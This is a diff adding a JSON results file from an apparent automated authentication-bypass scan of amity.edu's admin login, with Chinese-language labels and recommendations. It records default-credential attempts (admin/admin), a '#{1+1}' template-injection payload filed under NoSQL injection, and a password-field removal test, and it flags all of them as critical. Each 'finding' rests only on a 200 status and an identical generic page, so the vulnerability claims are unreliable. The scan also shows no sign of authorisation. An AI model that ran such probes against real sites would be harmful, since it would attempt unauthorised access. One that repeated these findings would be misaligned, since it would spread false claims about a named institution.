@@ -1,0 +1,160 @@
+{
+  "target": "Amity University Authentication Systems",
+  "scan_time": "2025-10-28 09:10:42",
+  "targets_scanned": 10,
+  "summary": {
+    "default_credentials_found": 2,
+    "sql_injection_bypasses": 0,
+    "nosql_injection_bypasses": 2,
+    "parameter_tampering_bypasses": 2,
+    "cookie_based_bypasses": 0
+  },
+  "test_results": {
+    "default_credentials": [
+      {
+        "url": "https://www.amity.edu/admin",
+        "form_url": "https://www.amity.edu/./",
+        "method": "POST",
+        "username": "admin",
+        "password": "admin",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      },
+      {
+        "url": "https://amity.edu/admin",
+        "form_url": "https://amity.edu/./",
+        "method": "POST",
+        "username": "admin",
+        "password": "admin",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      }
+    ],
+    "sql_injection": [],
+    "nosql_injection": [
+      {
+        "url": "https://www.amity.edu/admin",
+        "form_url": "https://www.amity.edu/./",
+        "method": "POST",
+        "payload": "#{1+1}",
+        "description": "Jinja2模板注入",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      },
+      {
+        "url": "https://amity.edu/admin",
+        "form_url": "https://amity.edu/./",
+        "method": "POST",
+        "payload": "#{1+1}",
+        "description": "Jinja2模板注入",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      }
+    ],
+    "parameter_tampering": [
+      {
+        "url": "https://www.amity.edu/admin",
+        "form_url": "https://www.amity.edu/./",
+        "method": "POST",
+        "test_name": "删除密码字段",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      },
+      {
+        "url": "https://amity.edu/admin",
+        "form_url": "https://amity.edu/./",
+        "method": "POST",
+        "test_name": "删除密码字段",
+        "username_field": "txtSEmail",
+        "password_field": "txtSPassword",
+        "response_status": 200,
+        "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+      }
+    ],
+    "cookie_based": [],
+    "form_analysis": []
+  },
+  "critical_findings": [
+    {
+      "url": "https://www.amity.edu/admin",
+      "form_url": "https://www.amity.edu/./",
+      "method": "POST",
+      "username": "admin",
+      "password": "admin",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    },
+    {
+      "url": "https://amity.edu/admin",
+      "form_url": "https://amity.edu/./",
+      "method": "POST",
+      "username": "admin",
+      "password": "admin",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    },
+    {
+      "url": "https://www.amity.edu/admin",
+      "form_url": "https://www.amity.edu/./",
+      "method": "POST",
+      "payload": "#{1+1}",
+      "description": "Jinja2模板注入",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    },
+    {
+      "url": "https://amity.edu/admin",
+      "form_url": "https://amity.edu/./",
+      "method": "POST",
+      "payload": "#{1+1}",
+      "description": "Jinja2模板注入",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    },
+    {
+      "url": "https://www.amity.edu/admin",
+      "form_url": "https://www.amity.edu/./",
+      "method": "POST",
+      "test_name": "删除密码字段",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    },
+    {
+      "url": "https://amity.edu/admin",
+      "form_url": "https://amity.edu/./",
+      "method": "POST",
+      "test_name": "删除密码字段",
+      "username_field": "txtSEmail",
+      "password_field": "txtSPassword",
+      "response_status": 200,
+      "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head><meta http-equiv=\"Conten"
+    }
+  ],
+  "recommendations": [
+    "发现严重认证漏洞，建议立即修复",
+    "实施强密码策略和账户锁定机制",
+    "启用多因素认证(MFA)",
+    "实施Web应用防火墙(WAF)",
+    "定期进行安全代码审查"
+  ]
+}
